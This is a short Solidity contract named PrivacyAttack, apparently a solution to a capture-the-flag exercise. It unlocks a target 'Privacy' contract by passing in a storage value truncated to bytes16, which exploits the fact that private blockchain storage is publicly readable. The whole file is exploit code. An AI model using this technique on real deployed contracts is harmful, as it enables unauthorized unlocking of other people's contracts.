pragma solidity ^0.8.0;

import "./Privacy.sol";

contract PrivacyAttack  {
    Privacy target;

    constructor(address _targetAddress) public {
        target  = Privacy(_targetAddress);
    }

    function unlock(bytes32 _value) public {
        bytes16 key = bytes16(_value);
        target.unlock(key);
    }
} 